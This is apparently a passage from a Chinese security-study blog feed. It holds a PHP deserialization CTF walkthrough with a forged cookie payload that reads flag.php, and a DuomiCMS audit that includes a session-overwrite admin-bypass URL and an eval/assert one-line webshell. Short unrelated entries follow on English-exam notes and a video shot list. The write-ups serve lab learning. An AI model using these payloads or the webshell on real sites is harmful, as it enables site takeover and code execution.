<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">class chybeta&#123;</span><br><span class="line">    var $test&#x3D;&#39;123&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$class1 &#x3D; new chybeta; &#x2F;&#x2F;新建对象</span><br><span class="line">$class1_ser&#x3D;serialize($class1);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">&#x2F;&#x2F; 0:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;变量类型:类名长度:类名:属性数量:</span><br><span class="line">&#x2F;&#x2F;&#123;属性类型:属性名长度:属性名;属性值类型:属性值内容;&#125;</span><br><span class="line">&#x2F;&#x2F; 0表示object对象,7表示对象的名称有7个字符</span><br><span class="line">&#x2F;&#x2F;chybeta 对象名称 1 表示只有一个值</span><br><span class="line">&#x2F;&#x2F;&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;s 表示string 字符串 4 表示test 字符串长度</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411202158339-1254244174.png" alt=""></p>
<blockquote>
<p>与serialize()对应的，unserialize（）可以从已存储的表示中创建php的值，单就本次环境而言，可以从序列化后的结果中恢复对象（object）</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test=<span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = <span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;'</span>; <span class="comment">//</span></span><br><span class="line">$class2_unser=unserialize($class2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">print_r($class2_unser);</span><br><span class="line"><span class="comment">// O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;</span></span><br><span class="line"><span class="comment">// O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;</span></span><br><span class="line"><span class="comment">//变量类型:类名长度:类名:属性数量:</span></span><br><span class="line"><span class="comment">//&#123;属性类型:属性名长度:属性名;属性值类型:属性值内容;&#125;</span></span><br><span class="line"><span class="comment">// O表示object对象,7表示对象的名称有7个字符</span></span><br><span class="line"><span class="comment">//chybeta 对象名称 1 表示只有一个值</span></span><br><span class="line"><span class="comment">//&#123;s:4:"test";s:3:"123";&#125;</span></span><br><span class="line"><span class="comment">//s 表示string 字符串 4 表示test 字符串长度</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411203044611-668318842.png" alt=""></p>
<p><strong>本质上serialize（）和unserialize（）在php内部实现上是没有漏洞的，漏洞的主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</strong></p>
<p><em>当传给unserialize()的参数可控时,那么用户就可以注入精心构造的<strong>payload</strong>。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</em></p>
<blockquote>
<p>php<strong>中有一类特殊的方法叫”Magic function”</strong>（魔术方法），这里我们着重关注一下几个：</p>
</blockquote>
<p>1、<strong>__construct()：</strong>当对象创建（new）时会自动调用。但在unserialize（）时是不会自动调用的。（构造函数）</p>
<p>2、<strong>__destruct()：</strong>当对象呗销毁时会自动调用。（析构函数）</p>
<p>3、<strong>__wakeup()：</strong>如前所提，unserialize（）时会自动地调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__wakeup"</span>.<span class="string">"  //"</span>.<span class="string">"unserialize()会检查是否存在一个__wakeup()方法。 如果存在，则会先调用__wakeup方法, 预先准备对象需要"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"__destruct"</span>.<span class="string">"  //"</span>.<span class="string">"析构函数会在某个对象的所有引用都被删除或者当对象被显式销毁时执行"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$class2=<span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"124";&#125;'</span>;</span><br><span class="line">print_r($class2);</span><br><span class="line">$class2_unser=unserialize($class2);</span><br><span class="line"><span class="comment">//print_r($class2_unser);</span></span><br><span class="line"><span class="comment">//echo "&lt;/br&gt;";//php脚本结束,释放__destruct</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411204911392-1997351730.png" alt=""></p>
<blockquote>
<p><strong>首先来了解下“__toString()”方法，当打印一个对象时，如果定义了“__toString()”方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</strong></p>
</blockquote>
<p>封神台靶场：<a href="http://59.63.200.79:8010/uns/index.php?source" target="_blank" rel="noopener">http://59.63.200.79:8010/uns/index.php?source</a><br><strong>同时发现$s-&gt;source=__FILE__存在可控变量</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7d729d6270ad3f7e5d5e5d24bbf778c1_77939.png" alt="img"></p>
<p><strong>尝试构造序列化对象</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/74784874ae21c4c90ef0d0f2aede0a13_66848.png" alt="img"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> highlight_file(<span class="string">'Readme.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>——tostring()魔术方法，当输出一个文件对象时，将其转化为字符串输出，且显示为代码高亮；</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘source’]))&#123;</span><br><span class="line">$s = <span class="keyword">new</span> readme();</span><br><span class="line">$s-&gt;source = FILE__;</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>获取get传参中source的值（有的话），$S新生成一个对象，对象中的source属性指向为__FILE__（即目录本身、当前路径），输出$_s这个对象（当然输出时为自动调用__ToString()魔术方法）。最后有一个exit，执行这一块会退出,所以我们不能让这一块执行，所以不能有get传参。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[‘todos’]))&#123;</span><br><span class="line">$c = $_COOKIE[‘todos’];</span><br><span class="line">$h = substr($c, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">$m = substr($c, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(md5($m) === $h)&#123;</span><br><span class="line">$todos = unserialize($m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>这一块是对cookie的检测和执行，并且有反序列化函数unserialize（），所以这一块是我们需要操作的。这一段代码首先获取传入的cookie值赋值给$c,并且cookie的前三十二位值赋值给$h，后面的赋值给$m，如果后三十二位MD5编码结果与前三十二位相同，则为$todos赋值$m作为参数反序列化执行的结果。配合下面一段代码遍历输出$todos。</strong></p>
<p>1、<strong><li><?=$todo?></li>直接输出，则会调用__toString（）方法</strong></p>
<p>2、<strong>而在 $s-&gt;source = FILE; 存在可控变量</strong></p>
<p>3、<strong>想要读取flag.php则需要满足条件md5($m) === $h</strong></p>
<p>4、<strong>所以我们尝试构造 $m = serialize($todos)和$h = md5($m)满足这两个条件</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($todos <span class="keyword">as</span> $todo):<span class="meta">?&gt;</span></span><br><span class="line">&lt;li&gt;<span class="meta">&lt;?</span>=$todo<span class="meta">?&gt;</span>&lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>再下面一段是关于POST传参的判断执行（没有反序列化函数，不能利用）：</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[‘text’]))&#123;</span><br><span class="line">$todo = $_POST[‘text’];</span><br><span class="line">$todos[] = $todo;</span><br><span class="line">$m = serialize($todos);</span><br><span class="line">$h = md5($m);</span><br><span class="line">setcookie(‘todos’, $h.$m);</span><br><span class="line">header(‘Location: ‘.$_SERVER[‘REQUEST_URI’]);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>然后我们就要利用cookie的传参来读取flag.php这一文档</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$c = $_COOKIE[<span class="string">'todos'</span>]; =&gt; 我们传入的</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/8492b5fb73f56ac306faf131fc559c6c.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cfef5a21b56aa225e2926b9e04b1d90a.png" alt="img"></p>
<p>;转为url编码%3b</p>
<p>e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0%3bO:6:”readme”:1:{s:6:”source”%3bs:8:”flag.php”%3b}}</p>
<p> <strong>复制到cookie里面直接读出flag.php源码</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/0547b93441faa6a0249e68f3239b866b_77812.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/e0fd1bb98ed3bad774ea508ecc39fd44_73096.png" alt="img"></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计--Duomicms变量覆盖函数</title>
    <url>/2021/04/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--Duomicms%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p><strong>白盒审计：</strong>白盒代码安全审计是常用的安全审计方法之一，是基于静态遍历代码逻辑的一种审计方式。</p>
</blockquote>
<p><strong>工具</strong>：<a href="https://github.com/euphrat1ca/SeaySourceCodeCheck/releases/tag/1" target="_blank" rel="noopener">Seay源代码审计系统</a>、虚拟机服务器、DuomiCMS源码。</p>
<blockquote>
<p>此次我们审计一个CMS，首先在本地虚拟机中安装好，方便审计时此时我们审计一个CMS,首先在本地虚拟机中安装好，方便审计时测试</p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411105235450-761458149.png" alt=""></p>
<blockquote>
<p><strong>Cms系统源文件张贴进虚拟机——安装</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411105627949-89801874.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110545992-869221068.png" alt=""></p>
<blockquote>
<p><strong>建议使用5.x以下是phpstudy不然需要配置ini</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110718720-1983062519.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411110811759-737830041.png" alt=""></p>
<p><strong>安装成功</strong></p>
<p><em>常规的审计方法一般有两种：</em></p>
<p><em>1、从index.php一步步去看别的页面。</em></p>
<p><em>2、危险函数搜索。本次主要尝试变量覆盖漏洞的审计，采用第二种方法</em></p>
<p><strong><em>变量覆盖漏洞：变量覆盖值指的是可以用我们自定义的参数值替换程序原有的变量值</em></strong></p>
<p><strong>怎么去寻找变量覆盖？</strong></p>
<p><em>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。变量覆盖漏洞有时候可以直接让我们webshell，拿到服务器的权限</em></p>
<p><strong>经常引发变量覆盖漏洞的函数有：extract() | parse_str()  | import_request_variables()</strong></p>
<p><strong>extract()函数(作用：将数组中变量导入到当前的符符号表)</strong></p>
<p><strong>上例题</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;1&quot;;</span><br><span class="line">$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>运行结果：$a = Cat; $b = Dog; $c = Horse</p>
</blockquote>
<p><strong>parse_str()将查询字符串解析到变量中:</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name&#x3D;zkaq&amp;&amp;age&#x3D;60&quot;);   &#x2F;&#x2F; test&#x3D;123&amp;gift&#x3D;123</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $age;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411160926565-1042511209.png" alt=""></p>
<p><strong>输出了zkaq和60</strong><br><strong>那么parse_str(“name=Bill&amp;age=60”) 相当于完成了$name =’zkaq’和$age =’60’</strong><br><strong>那么如果在parse_str中可以直接传参的话，那么是不是也可以覆盖变量呢。</strong></p>
<p><strong>不仅仅是函数会导致变量覆盖，有些特殊符号的特殊搭配也会引起变量覆盖漏洞，比如$$</strong></p>
<p><strong>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value) </span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>


<blockquote>
<p><strong>这个代码会接受我们GET提交、POST提交、COOKIE参数，将这个接受来的参数依次放入$_REQUEST</strong></p>
<p>$_key=&gt;$_value 这个是数组解析，实际上就是键值分离</p>
<p>正常而言$a=1是一个定值,但是因为_key的缘故,当我传参a=2;那么key=addslashes($_value);就变为了$a=2.</p>
<p><strong>首先在审计软件中加入本次漏洞全局搜索规则：</strong></p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411113229004-1750202241.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114511786-1078136745.png" alt=""></p>
<blockquote>
<p>系统配置——添加规则（就是存在漏洞的地方）</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">规则：([^\$&quot;]|$)\$\&#123;?\$</span><br><span class="line">描述：$$变量覆盖漏洞</span><br></pre></td></tr></table></figure></div>

<p> <img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114802766-7196608.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411114823593-1873670610.png" alt=""></p>
<p><strong>添加成功</strong></p>
<p><em>全局搜索功能：搜索你感觉看不大懂的函数，因为很可能是自定义函数：</em></p>
<p>我们本次要找的是doumiphp\common.php文件的$$变量覆盖漏洞：直接定位就不搜索了</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411115409028-40369347.png" alt=""></p>
<p>看一看这个变量函数满足的条件</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411162651877-824113813.png" alt=""></p>
<p><strong>1、必须要有传参</strong></p>
<p><strong>2、正则匹配不能有键名有cfg和GLOBALS传参中有$_k</strong></p>
<p><strong>3、不能有COOKIE传参中有$_k</strong></p>
<blockquote>
<p>这个系统有一个问题是cookie和session绑定，而且普通用户和管理员的session只有轻微的不同，我们只需要在一个接收session传参并且存在变量覆盖漏洞的页面将传参修改，便可获得管理员权限，登录管理员后台（），其中我们需要找到管理员的session值和普通用户的session的区别，分别抓取两个session的值对比：</p>
</blockquote>
<p><img src="https://bbs.zkaq.cn/upload/md/a8bcd56df198e6c5ec5dba7d008f9a29_87585.png" alt="img"></p>
<p><strong>接着找到这个检查核对的页面：找不到目录怎么办：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7a9aacb52d2b5057b580e7fe05163002_41636.png" alt="img"></p>
<p><strong>加一行修改虚拟机里的源代码，登录测试爆出绝对路径：不知道文件位置的情况：在该页面中写入die()函数，当测试执行时网页报错会显示出绝对路径。</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/dc40ab11c8a89221340c29446b9fce97_88479.png" alt="img"></p>
<p><strong>但是最后要记得改回去，否则对于我们后面的测试会有碍。</strong><br><strong>然后进入check.admin.php页面找到SESSION的变量赋值规则：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7f1b2097f379b6c87dd487e4868460a7_41037.png" alt="img"></p>
<p><strong>主要找到保存回话的函数，这样我们给cookie赋值SESSION的话去别的页面还会带着这个管理员权限的session。</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/0cc795917c522838c5090bc83503cd87_52113.png" alt="img"></p>
<p>通过这里可以设置session值进行赋值来获得权限，groupid是权限的意思，我们全文一搜索，轻松的发现</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411200437677-1987847776.png" alt=""></p>
<p><strong>对比找到SESSION不同的地方，就是管理员的值：<br>不同的键值：_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin<br>构建POC：interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin<br>放入接受SESSION传参且存在变量覆盖漏洞的地方，给我们的cookie绑定上管理员SESSION值，然后访问管理员后台，自动登录：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/30619e52fb63bad3c319e348ac582294_93535.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/98eda8f521184091ca070f36f1f52700_61062.png" alt="img"></p>
<p>本地环境测试下面靶场：</p>
<p>测试靶场：<a href="http://59.63.200.79:8010/abc/upload/" target="_blank" rel="noopener">http://59.63.200.79:8010/abc/upload/</a></p>
<p><img src="https://bbs.zkaq.cn/upload/md/1c03eeec760e2410a477447850053bcb_14804.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/642c8244ffbd0e1e459949eb7c8509dc_18045.png" alt="img"></p>
<p>获得flag.</p>
<p><strong>最后在后台的全局中的百度推送，可以通过插版权的方法拿到一个webshell：</strong><br><strong>插入一句话木马：123456789”;eval($_POST[‘z’]);//</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/8daa472f7b87472fd9a1e6f769de9c73_60276.png" alt="img"></p>
<p><strong>会写入到 /duomicms/data/admin/ping.php 文件中，这也是我们审计中可以发现的，如果是黑盒的话，就无从下手了。</strong><br><strong>后来发现这个CMS禁用了eval()函数，使用assert()函数替代了eval()函数最后成功写入一句话木马。</strong><br><strong><a href="http://127.0.0.1/upload/data/admin/ping.php?z=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/upload/data/admin/ping.php?z=phpinfo()</a></strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/56d2e7553d33fbf782b6f1f9917b4f88_48857.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/4b0372d5997554ecd9bab5e3f66fe864_25735.png" alt="img"></p>
<p><strong>eval($_REQUEST[‘z’])<br>assert($_REQUEST[‘z’])</strong></p>
<p><strong>不过有一个问题，eval传入一句话木马，系统本身禁用了eval()这个函数，我们访问写入木马的页面访问不到，但是菜刀可以连接上。改为assert（）方式传入，可以检测到写入木马的页面 但是无法菜刀连接。我很费解！</strong></p>
<p>漏洞分析：<a href="https://www.freebuf.com/column/188018.html" target="_blank" rel="noopener">https://www.freebuf.com/column/188018.html</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Monster第一天</title>
    <url>/2021/01/07/%E9%95%BF%E9%9A%BE%E5%8F%A5%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>详细阅读之策略</title>
    <url>/2020/12/04/%E8%AF%A6%E7%BB%86%E9%98%85%E8%AF%BB%E4%B9%8B%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="区域解题内涵"><a href="#区域解题内涵" class="headerlink" title="区域解题内涵"></a>区域解题内涵</h1><pre><code>|- 跳读文章找区域
|- 依次而下是原则（主旨为独立题型）
|- 区域之间无交集
|- 前本后句是核心</code></pre>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>拍摄</title>
    <url>/2020/10/27/%E6%8B%8D%E6%91%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一个场景"><a href="#第一个场景" class="headerlink" title="第一个场景"></a>第一个场景</h1><p>地点：天台处<br>拍摄方式：</p>
<blockquote>
<p>step 1 从下往上缓慢拉动然后cut（可以选择切镜头拍摄）继续跟随往上拉到能看到全身和场景，然后接着拿着镜头向右缓步前行cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027143301917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027143332412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027143418735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 2 人物看向镜头微笑然后转头，同时镜头向左缓慢拉动形成动态cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027143442315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 3 模糊拉近拍摄人物微笑镜头，人物在画面中心然后cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027143526417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 4 接着镜头向下方移动cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027144356588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>Step 5 镜头稳定向左平移 角色上栏杆cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027144442290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 6 镜头向右平移cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027144629742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 7 镜头在人物左边，进行升格拍摄向上拉到人物笑脸（人物撩动头发并微笑看向镜头）cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027144749484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
